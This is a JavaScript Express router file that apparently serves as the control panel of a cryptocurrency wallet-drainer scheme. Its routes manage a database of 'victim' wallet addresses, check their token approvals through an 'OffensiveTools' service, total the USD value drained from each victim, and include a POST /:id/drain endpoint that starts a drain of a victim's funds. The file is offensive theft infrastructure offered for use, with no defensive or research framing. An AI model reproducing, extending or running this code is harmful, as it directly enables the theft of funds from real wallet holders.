const express = require('express');
const router = express.Router();
const { asyncHandler } = require('../middleware/errorHandler');
const { requirePermission } = require('../middleware/auth');
const Victim = require('../models/Victim');
const Transaction = require('../models/Transaction');
const OffensiveTools = require('../services/OffensiveTools');

// Initialize offensive tools
const offensiveTools = new OffensiveTools();

// Get all victims with pagination and filtering
router.get('/', requirePermission('canViewVictims'), asyncHandler(async (req, res) => {
    const {
        page = 1,
        limit = 20,
        network,
        riskLevel,
        status,
        sortBy = 'lastActivity',
        sortOrder = 'desc',
        search
    } = req.query;

    const query = {};

    // Apply filters
    if (network) query.network = network;
    if (riskLevel) query.riskLevel = riskLevel;
    if (status) query.status = status;

    // Search functionality
    if (search) {
        query.$or = [
            { address: { $regex: search, $options: 'i' } },
            { ensName: { $regex: search, $options: 'i' } },
            { labels: { $in: [new RegExp(search, 'i')] } }
        ];
    }

    const options = {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { [sortBy]: sortOrder === 'desc' ? -1 : 1 },
        populate: [
            { path: 'transactions', select: 'amount usdValue tokenSymbol createdAt status' }
        ]
    };

    const victims = await Victim.paginate(query, options);

    // Add computed fields
    const victimsWithStats = victims.docs.map(victim => ({
        ...victim.toObject(),
        transactionCount: victim.transactions.length,
        totalDrained: victim.transactions
            .filter(t => t.status === 'confirmed')
            .reduce((sum, t) => sum + (parseFloat(t.usdValue) || 0), 0)
    }));

    res.json({
        victims: victimsWithStats,
        pagination: {
            page: victims.page,
            totalPages: victims.totalPages,
            totalVictims: victims.totalDocs,
            hasNext: victims.hasNextPage,
            hasPrev: victims.hasPrevPage
        }
    });
}));

// Get victim by ID
router.get('/:id', requirePermission('canViewVictims'), asyncHandler(async (req, res) => {
    const victim = await Victim.findById(req.params.id)
        .populate('transactions')
        .populate('contracts', 'address network name');

    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    // Get detailed transaction history
    const transactions = await Transaction.find({ victim: victim._id })
        .sort({ createdAt: -1 })
        .populate('contract', 'name network');

    // Calculate statistics
    const stats = {
        totalDrained: transactions
            .filter(t => t.status === 'confirmed')
            .reduce((sum, t) => sum + (parseFloat(t.usdValue) || 0), 0),
        transactionCount: transactions.length,
        successfulDrains: transactions.filter(t => t.status === 'confirmed').length,
        failedDrains: transactions.filter(t => t.status === 'failed').length,
        pendingDrains: transactions.filter(t => t.status === 'pending').length,
        networks: [...new Set(transactions.map(t => t.network))],
        tokens: [...new Set(transactions.map(t => t.tokenSymbol))]
    };

    res.json({
        victim,
        transactions,
        stats
    });
}));

// Update victim information
router.put('/:id', requirePermission('canEditVictims'), asyncHandler(async (req, res) => {
    const { labels, riskLevel, notes, status } = req.body;

    const updateData = {};
    if (labels !== undefined) updateData.labels = labels;
    if (riskLevel !== undefined) updateData.riskLevel = riskLevel;
    if (notes !== undefined) updateData.notes = notes;
    if (status !== undefined) updateData.status = status;

    updateData.lastActivity = new Date();

    const victim = await Victim.findByIdAndUpdate(
        req.params.id,
        updateData,
        { new: true, runValidators: true }
    );

    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    res.json(victim);
}));

// Delete victim
router.delete('/:id', requirePermission('canDeleteVictims'), asyncHandler(async (req, res) => {
    const victim = await Victim.findByIdAndDelete(req.params.id);

    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    // Also delete associated transactions
    await Transaction.deleteMany({ victim: req.params.id });

    res.json({ message: 'Victim and associated transactions deleted successfully' });
}));

// Get victim's approved tokens
router.get('/:id/approvals', requirePermission('canViewVictims'), asyncHandler(async (req, res) => {
    const victim = await Victim.findById(req.params.id);

    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    // Get current approvals from blockchain
    const approvals = await offensiveTools.checkApprovals(victim.address, victim.network);

    // Update victim's approved tokens
    victim.approvedTokens = approvals;
    victim.lastApprovalCheck = new Date();
    await victim.save();

    res.json({
        victim: victim.address,
        network: victim.network,
        approvals,
        lastChecked: victim.lastApprovalCheck
    });
}));

// Manually trigger drain for a victim
router.post('/:id/drain', requirePermission('canExecuteDrains'), asyncHandler(async (req, res) => {
    const victim = await Victim.findById(req.params.id);

    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    if (victim.status !== 'active') {
        return res.status(400).json({ error: 'Victim is not active' });
    }

    // Trigger manual drain
    const result = await offensiveTools.drainVictim(victim);

    res.json({
        message: 'Drain operation initiated',
        victimId: victim._id,
        transactionHash: result.transactionHash,
        status: 'pending'
    });
}));

// Get victim's transaction history
router.get('/:id/transactions', requirePermission('canViewVictims'), asyncHandler(async (req, res) => {
    const { page = 1, limit = 50, status, token } = req.query;

    const query = { victim: req.params.id };
    if (status) query.status = status;
    if (token) query.tokenSymbol = token;

    const transactions = await Transaction.paginate(query, {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { createdAt: -1 },
        populate: [
            { path: 'contract', select: 'name network' }
        ]
    });

    res.json(transactions);
}));

// Add victim manually
router.post('/', requirePermission('canAddVictims'), asyncHandler(async (req, res) => {
    const { address, network, labels = [], riskLevel = 'medium', notes = '' } = req.body;

    // Validate required fields
    if (!address || !network) {
        return res.status(400).json({ error: 'Address and network are required' });
    }

    // Check if victim already exists
    const existingVictim = await Victim.findOne({ address: address.toLowerCase(), network });
    if (existingVictim) {
        return res.status(409).json({ error: 'Victim already exists' });
    }

    // Create new victim
    const victim = new Victim({
        address: address.toLowerCase(),
        network,
        labels,
        riskLevel,
        notes,
        status: 'active',
        discoveredAt: new Date(),
        lastActivity: new Date()
    });

    await victim.save();

    // Check initial approvals
    try {
        const approvals = await offensiveTools.checkApprovals(victim.address, victim.network);
        victim.approvedTokens = approvals;
        victim.lastApprovalCheck = new Date();
        await victim.save();
    } catch (error) {
        // Log error but don't fail the creation
        console.error('Failed to check initial approvals:', error);
    }

    res.status(201).json(victim);
}));

// Bulk operations
router.post('/bulk/status', requirePermission('canEditVictims'), asyncHandler(async (req, res) => {
    const { victimIds, status } = req.body;

    if (!victimIds || !Array.isArray(victimIds) || !status) {
        return res.status(400).json({ error: 'Victim IDs array and status are required' });
    }

    const result = await Victim.updateMany(
        { _id: { $in: victimIds } },
        {
            status,
            lastActivity: new Date()
        }
    );

    res.json({
        message: `Updated ${result.modifiedCount} victims`,
        modifiedCount: result.modifiedCount
    });
}));

// Get victim statistics
router.get('/stats/overview', requirePermission('canViewVictims'), asyncHandler(async (req, res) => {
    const stats = await Victim.aggregate([
        {
            $group: {
                _id: null,
                totalVictims: { $sum: 1 },
                activeVictims: {
                    $sum: { $cond: [{ $eq: ['$status', 'active'] }, 1, 0] }
                },
                highRiskVictims: {
                    $sum: { $cond: [{ $eq: ['$riskLevel', 'high'] }, 1, 0] }
                },
                criticalVictims: {
                    $sum: { $cond: [{ $eq: ['$riskLevel', 'critical'] }, 1, 0] }
                }
            }
        },
        {
            $lookup: {
                from: 'transactions',
                localField: '_id',
                foreignField: 'victim',
                as: 'transactions'
            }
        },
        {
            $project: {
                totalVictims: 1,
                activeVictims: 1,
                highRiskVictims: 1,
                criticalVictims: 1,
                totalDrained: {
                    $sum: {
                        $map: {
                            input: {
                                $filter: {
                                    input: '$transactions',
                                    cond: { $eq: ['$$this.status', 'confirmed'] }
                                }
                            },
                            as: 'tx',
                            in: { $toDouble: '$$tx.usdValue' }
                        }
                    }
                }
            }
        }
    ]);

    res.json(stats[0] || {
        totalVictims: 0,
        activeVictims: 0,
        highRiskVictims: 0,
        criticalVictims: 0,
        totalDrained: 0
    });
}));

module.exports = router;